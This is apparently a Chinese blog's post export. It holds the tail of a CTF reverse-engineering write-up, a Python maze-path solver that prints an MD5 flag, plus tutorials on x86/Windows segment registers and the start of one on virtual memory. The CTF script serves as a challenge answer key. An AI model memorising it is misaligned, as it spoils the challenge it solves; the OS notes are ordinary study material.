class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_way</span>(<span class="params">a,b,c,num,max_num</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testc</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[a*<span class="number">64</span>+b*<span class="number">8</span>+i] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; c-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;c+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, c</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testb</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[a*<span class="number">64</span>+i*<span class="number">8</span>+c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; b-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;w&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;b+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, b</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testa</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[i*<span class="number">64</span>+b*<span class="number">8</span>+c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; a-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;a+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;u&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, b</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">if</span> num&gt;max_num:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>,<span class="number">0</span></span><br><span class="line">    way = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pos = a*<span class="number">64</span>+b*<span class="number">8</span>+c</span><br><span class="line">    <span class="keyword">if</span> pos==<span class="number">436</span>:</span><br><span class="line">        <span class="keyword">return</span> way,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (num%<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">map</span>=map2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">map</span>=map1</span><br><span class="line">    test_c = testc()</span><br><span class="line">    test_a = testa()</span><br><span class="line">    test_b = testb()</span><br><span class="line">    <span class="keyword">if</span> test_c[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_c[<span class="number">1</span>])):</span><br><span class="line">            next_way =  find_way(a,b,test_c[<span class="number">1</span>][j][<span class="number">0</span>],num+<span class="number">1</span>,max_num) <span class="comment">#第一种情况</span></span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way=test_c[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way,<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_a[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_a[<span class="number">1</span>])):</span><br><span class="line">            next_way = find_way(test_a[<span class="number">1</span>][j][<span class="number">0</span>],b,c,num+<span class="number">1</span>,max_num)</span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way = test_a[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_b[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_b[<span class="number">1</span>])):</span><br><span class="line">            next_way = find_way(a,test_b[<span class="number">1</span>][j][<span class="number">0</span>],c,num+<span class="number">1</span>,max_num)</span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way = test_b[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way, <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> way, <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> max_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">50</span>):</span><br><span class="line">    mstr = (find_way(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,max_num))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mstr!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(mstr)</span><br><span class="line">        <span class="built_in">hash</span> = hashlib.md5()</span><br><span class="line">        <span class="built_in">hash</span>.update(mstr.encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">hash</span>.hexdigest()+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 算法 </tag>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-段寄存器</title>
      <link href="/posts/3bf83b56.html"/>
      <url>/posts/3bf83b56.html</url>
      
        <content type="html"><![CDATA[<hr><p>16位：实模式<br>32位：保护模式<br>64位：IA-32e模式</p><hr><p>ES  CS SS DS FS GS LDTR TR</p><p>段寄存器长度：96位</p><p>实模式</p><p>实际地址=段地址左移4位+偏移量</p><p>eg:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">si</span>],<span class="built_in">ax</span></span><br><span class="line">等价</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">ds</span>*<span class="number">16</span>+<span class="built_in">si</span>],<span class="built_in">ax</span></span><br></pre></td></tr></table></figure><p>保护模式：</p><p>保护模式下，cpu依旧通过短地址和偏移量寻址，但是段寄存器不直接保存偏移，下面是段寄存器在保护模式下的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span>//示意</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Selector;<span class="comment">//段选择子</span></span><br><span class="line">WORD Atrributes;<span class="comment">//属性</span></span><br><span class="line">DWORD Base;</span><br><span class="line">DWORD Limit;<span class="comment">//段界限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>段选择子：</p><p>002B：（前8位是0）00101  0  11</p><p>其中低2位为当前请求权限级别<code>RPL</code>：从r0到r3，其中CS寄存器的低2位存着cs中eip的偏移，即cs指向当前代码段，它的RPL被称为<code>CPL</code>，同理于指向堆栈的SS寄存器</p><p>第3位表示查询哪张表：一般有两张表：GDT和LDT表,0表示GDT，1表示LDT（LDT必须嵌套在GDT中，同时可以有多张LDT）</p><p>如果是1：会装载某一个ldt表，通过段选择子在gdt中找到ldt执行后续操作</p><p>前5位表示段描述符索引，指向GDT中存放段描述符的地址，即gdt[x],n为前五位的值，所以</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">段描述符位置 </span>=<span class="string"> gdt首地址 + x*8</span></span><br></pre></td></tr></table></figure><p>其中段描述符存放了除了段选择子之外的属性</p><p><img src="https://s2.loli.net/2024/06/03/RvPYDWao5EN7d2b.png" alt="image-20240603014954353"></p><p><img src="https://s2.loli.net/2024/06/03/p1tNuKkRPAUF4Ca.png" alt="image-20240603134721994"></p><p>其中：</p><p>绿色表示段基址<br>蓝色表示段界限<br>黄色表示段属性</p><p>段属性中，先看P,DPL,S,TYPE这几段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">P占一位：</span><br><span class="line"><span class="attribute">P</span>=0 该段不在内存中</span><br><span class="line"><span class="attribute">P</span>=1 该段在内存中</span><br><span class="line">DPL占2位：</span><br><span class="line">表示特权等级0~3</span><br><span class="line"></span><br><span class="line">S占一位：</span><br><span class="line"><span class="attribute">S</span>=0 该段是系统段/门</span><br><span class="line"><span class="attribute">S</span>=1 该段是数据段或代码段</span><br><span class="line"></span><br><span class="line">TYPE占4位：</span><br><span class="line">如果<span class="attribute">S</span>=1</span><br><span class="line">4位分别为：执行位，一致/方向位，读写位，访问位</span><br><span class="line">执行位：为0表示这是数据段，为1表示是代码段（是否可执行）</span><br><span class="line">一致/方向位：执行位为1：为0表示普通段，为1表示一致代码段；执行位为0：为0表示向上增长，为1表示向下增长</span><br><span class="line">读写位：执行位为0：为1表示可读可写，为0表示可读；执行位为1：为1表示可读可执行，为0表示可执行</span><br><span class="line">访问位：为1表示已访问过，为0表示未访问过</span><br></pre></td></tr></table></figure><p>其中一致位表示是不是一致代码段。<br>这里需要先看一下这个定义：</p><blockquote><p>操作系统保护模式下把代码段分为一致代码段和非一致代码段的原因是：内核程序和用户程序要分开，内核程序不能被用户程序干扰。但是有时候用户程序也需要读取内核的某些数据，于是操作系统就从内核程序中分配一些可以供用户程序访问的段，但是不允许用户程序写入数据，用户程序访问这些段时遵循以下规则：</p><ol><li>内核程序不知道用户程序的数据，不调用用户程序的数据，也不转移到用户程序中来</li><li>用户程序只能访问到内核的某些共享段，这些段称为<code>一致代码段</code></li><li>用户程序不能访问内核不共享的段</li></ol></blockquote><p>所以一致代码段就是操作系统内核拿出来的共享段：</p><p>性质是</p><blockquote><ol><li>特权级高的程序不允许访问特权级低的数据：即内核态不允许调用用户态的数据。</li><li>特权级低的程序可以访问到特权级高的程序，但是特权级不会改变，即不会从用户态切换到内核态。</li></ol></blockquote><p>所以如果是低特权级到高特权级，可以直接访问，且权限不变，如果是高特权级到低特权级，触发常规保护错误。</p><p>非一致代码段：为了避免低特权级的访问而被操作系统保护起来的系统代码</p><p>性质是</p><blockquote><ol><li>只允许同特权级访问。</li><li>绝对禁止不同特权级直接访问：内核态不去用户态，用户态也不使用内核态。</li><li>通常低特权级代码必须通过<code>门调用</code>来实现对高特权级代码段的访问和调用。</li></ol></blockquote><p>所以如果特权级不相等，触发常规保护错误</p><p>这里的特权等级检测是根据DPL和CPL的值来判断的</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DPL&gt;<span class="operator">=</span>CPL  </span><br><span class="line">可以进入一致代码段</span><br><span class="line"></span><br><span class="line"><span class="attribute">DPL</span><span class="operator">=</span><span class="operator">=</span>CPL and RPL&lt;<span class="operator">=</span>DPL</span><br><span class="line">可以进入普通代码段/非一致代码段</span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">如果S=<span class="number">0</span>，系统段</span><br><span class="line">TYPE只定义了<span class="number">12</span>个值</span><br><span class="line"><span class="number">0x1</span> 可用286TSS</span><br><span class="line"><span class="number">0x2</span> 该段存储了LDT（局部描述符表）</span><br><span class="line"><span class="number">0x3</span> 忙286TSS</span><br><span class="line"><span class="number">0x4</span> <span class="number">286</span>调用门</span><br><span class="line"><span class="number">0x5</span> 任务门</span><br><span class="line"><span class="number">0x6</span> <span class="number">286</span>中断门</span><br><span class="line"><span class="number">0x7</span> <span class="number">286</span>陷阱门</span><br><span class="line"><span class="number">0x8</span> </span><br><span class="line"><span class="number">0x9</span> 可用386TSS</span><br><span class="line"><span class="number">0xa</span> </span><br><span class="line"><span class="number">0xb</span> 忙386TSS</span><br><span class="line"><span class="number">0xc</span> <span class="number">386</span>调用门</span><br><span class="line"><span class="number">0xd</span> </span><br><span class="line"><span class="number">0xe</span> <span class="number">386</span>中断门</span><br><span class="line"><span class="number">0xf</span> <span class="number">386</span>陷阱门</span><br></pre></td></tr></table></figure><p>另外4个属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AVL 占<span class="number">1</span>位</span><br><span class="line">无定义</span><br><span class="line">L 占<span class="number">1</span>位</span><br><span class="line">如果代码段是<span class="number">64</span>位，为<span class="number">1</span>（此时D为<span class="number">0</span>），否则<span class="number">0</span></span><br><span class="line">D/<span class="selector-tag">B</span> 占<span class="number">1</span>位</span><br><span class="line">如果对应代码段D：这是<span class="number">32</span>位代码段为<span class="number">1</span>，否则为<span class="number">16</span>位代码段为<span class="number">0</span></span><br><span class="line">如果对应栈段<span class="selector-tag">B</span>：是被SS寄存器指向的数据段</span><br><span class="line">为<span class="number">1</span>：采用<span class="number">32</span>位栈指针寄存器，否则为<span class="number">0</span>，采用<span class="number">16</span>位栈指针寄存器</span><br><span class="line">如果对应向下扩展的数据段<span class="selector-tag">B</span>：</span><br><span class="line">为<span class="number">1</span>：段的上界为<span class="number">4</span>GB，为<span class="number">0</span>：上界为<span class="number">64</span>KB</span><br><span class="line">G 占一位</span><br><span class="line">为<span class="number">0</span>：段界限粒度（单位）为字节，为<span class="number">1</span>：段界限单位为<span class="number">4</span>KB</span><br></pre></td></tr></table></figure><p>那么又有一个问题：</p><p>为什么段寄存器一共有96位，这里不是一共才64（段描述符）+16（段选择子）=80位吗</p><p>这里会发现：段描述符中的limit段是3字节，最大值为ffffff，又有G可以表示最大单位为4KB,再加属性里面的保留的一（十六进制）位空位<br>(ffffff-1)*4096=ffffffff<br>(8+4)x4+8x4+16=96</p><p>这个不像数组，界限为FFFFFFFF那么它可以取到0~FFFFFFFF</p><p>参考资料</p><p><a href="https://blog.csdn.net/linuxheik/article/details/7542320">RPL保存在选择子里，那么CPL是保存在哪里的_cpl 在哪里-CSDN博客</a></p><p><a href="https://blog.csdn.net/abc123lzf/article/details/109289567">x86保护模式——全局描述符表GDT详解_gdt全局描述符表 作用-CSDN博客</a></p><h2 id="段选择器成员">段选择器成员</h2><p><img src="https://s2.loli.net/2024/06/18/g6plXIqAvzMOa2h.png" alt="image-20240618175919652"></p><p>FS地址不一定和图中相同</p><p>通过以下代码查看对应段寄存器的读写属性</p><p>（由于）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> var = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax, ss;</span><br><span class="line">mov ds, ax;</span><br><span class="line">mov edx, <span class="number">1</span>;</span><br><span class="line">mov dword ptr ds : [var] , edx;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序可以通过，且表明了ss可读，ds可写的属性</p><p>将其换为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> var = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax, cs;</span><br><span class="line">mov ds, ax;</span><br><span class="line">mov edx, <span class="number">1</span>;</span><br><span class="line">mov dword ptr ds : [var] , edx;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现调试状态可以执行，直接运行会在输出时报错</p><p>关于为什么不能直接用立即数给段寄存器赋值：</p><p>网上的解释：</p><p><a href="https://bbs.csdn.net/topics/340215235">为什么立即数不能直接赋给段寄存器-CSDN社区</a></p><p>不懂QAQ</p><hr><p>在线程和进程不改变时，在写之后的读不会读gdt，在手工修改进程线程时，会读一次gdt</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> Win核心 </category>
          
          <category> Win内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 段 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-虚拟内存与内存管理</title>
      <link href="/posts/c53724db.html"/>
      <url>/posts/c53724db.html</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟内存">虚拟内存</h2><h3 id="物理寻址和虚拟寻址">物理寻址和虚拟寻址</h3><p>把物理内存分为M个连续的字节数组。分别标号为0,1,2…这就是物理地址。</p><p>CPU直接查找对应的物理地址来查找信息就是<code>物理寻址</code>。CPU直接对内存总线发送地址然后主存接收到以后返回内容给CPU，并放在寄存器里。</p><p>现在，CPU一般先生成一个虚拟地址，然后将虚拟地址发送给MMU(内存管理单元)翻译成物理地址，这时才发送给主存，它再返回地址中的内容。这叫<code>虚拟寻址</code></p><blockquote><p>简要地址翻译流程：</p><p>在内存中存放了一个查询表（称为页表），MMU通过读取查询表来动态翻译虚拟地址，表的内容由操作系统管理。（一般情况下，第一级页表就在MMU中，被称为TLB，这样速度更快）</p></blockquote><hr><h3 id="地址空间">地址空间</h3><p>一个非负整数地址的有序集合。意思是：用自然数从0开始依次为一个地方编号，得到的数的有序集合就是<code>地址空间</code>。如果这个地址空间的元素是连续的整数，就称它为<code>线性地址空间</code>。</p><p>现在，CPU通过映射n比特位得到了$2^n$个地址编号，形成的线性地址空间的大小是$2^n$。记作$N = 2^n$，最小地址是0，最大地址是$N-1$。这样形成的地址空间被叫做<code>n位地址空间</code>。它表示虚拟内存，现在的32位系统/64位系统即是这个意思。</p><p>内存也有一个空间，它是物理存在的。它的大小记作M，不要求一定为2的幂次。</p><hr><h3 id="页">页</h3><p>我们已经知道是从虚拟地址到物理地址的映射了，页的实现就是映射实现的具体方式。</p><p>为了让虚拟内存中的地址可以顺利转换到物理地址，我们规定每4KB长度的地址称为一个<code>页</code>，和地址一样，分为虚拟页和物理页(物理页又称为页帧)。虚拟页面的集合为{未分配的页，已缓存的页，未缓存的页}，后两项统称已分配的页。我们把一个虚拟也的大小称为$P=2^p$</p><p>而映射的基本单位就是一个页。也就是说，一个进程在内存中是被划分为n页分开存放的（也可以挨在一起）</p><blockquote><p>缓存表示已经分配到物理内存中，而未缓存表示在其它存储介质中，比如硬盘。如果系统查询页时发现是未缓存页，这称为未命中(缺页)，然后要把那个页和内存中的一个物理页交换以访问它</p></blockquote><h3 id="页表">页表</h3><p>系统为了查询哪些页是已经分配的，哪些页是没有缓存的，以及页缓存在哪里等信息，同硬件/软件一起在内存中维护了一张页表。每个页表都是一个页表条目(PTE)数组</p><p>页表中每一个虚拟地址都对应了一个物理地址，也可能对应其它硬件，比如磁盘的某个位置。同时设置了一些标志来判断部分情况(比如可能0表示没有映射)</p><h3 id="缺页">缺页</h3><p>如果cpu查询页表发现它是一个未缓存页，就会引发一个<code>缺页异常</code>，从而进入内核态执行以下操作：</p><ul><li>选择一个页表中查询次数最少的页作为牺牲页</li><li>如果它被修改了，那么写回磁盘</li><li>将这次查询的物理页写到牺牲页对应的物理页中</li><li>刷新页表，然后可以继续访问</li></ul><hr><h3 id="内存管理">内存管理</h3><p>实际上，操作系统并不是只维护一张页表，而是对于每个进程都维护一张页表，每个的大小也都是4KB，从而形成了每个进程的独立虚拟地址空间。这样，每个程序的EP可以都是0x400000，而不用担心相互影响。</p><p><img src="https://s2.loli.net/2024/08/15/oDiGwUxSMshrFgl.png" alt="image-20240815201626132"></p><h3 id="内存保护">内存保护</h3><p>页表中有访问权限的标志位可以控制对对应页的访问，综合段寄存器，实现对段页权限的划分，提供安全等级</p><hr><h3 id="地址翻译">地址翻译</h3><p>在这里说明虚拟地址转为物理地址的流程</p><p>任何虚拟地址都由两部分组成(物理地址也是)：</p><p>虚拟页号和页偏移，长度分别为n-p-1和p-1</p><p>转换时，只转换虚拟页号，转为物理地址后+页偏移就得到真实的物理地址</p><p><img src="https://s2.loli.net/2024/08/15/MCLDWKaB5ghyHXV.png" alt="image-20240815202956150"></p><p>正如上面讲的，为了减少时间消耗，MMU中有一个翻译后备缓冲器TLB，它是一个物理设备，每一行都有一个由单个PTE组成的块，它可以直接被cpu查询</p><p><img src="https://s2.loli.net/2024/08/15/IkMBq6neoRvNSdj.png" alt="image-20240815203950975"></p><h3 id="多级页表">多级页表</h3><p>很明显，如果是32位系统，由于一个程序就有一个4MB的页表（一个页表项需要4字节，有4GB/4KB=$2^{20}$项），如果开了50个进程，就有200MB大小的空间，这显然是不能忍受的。</p><p>于是，使用多级页表可以实现压缩内存。首先：第一级页表在内存中，最常用的在TLB中，检索地址时，先检索TLB，如果没有，再检索内存，然后转到二级页表，被称为片(chunk)。再在片中查找基址再转到虚拟内存。</p><p>如果第一级页表不存在对应PTE，第二级页表页不会存在。<br>第二级页表不一定在内存中，只有最常用的才在。</p><p>这样就减轻了内存的负担。</p><p>实际上，使用的层级还更多</p><hr><h2 id="Windows内存管理层级及API">Windows内存管理层级及API</h2><p><a href="https://www.labri.fr/perso/betrema/winnt/heapmm.html">Managing Heap Memory in Win32</a></p><ul><li>虚拟内存</li><li>堆</li><li>内存映射文件</li></ul><p><img src="https://s2.loli.net/2024/12/21/8G5xhPnNspmfzWo.png" 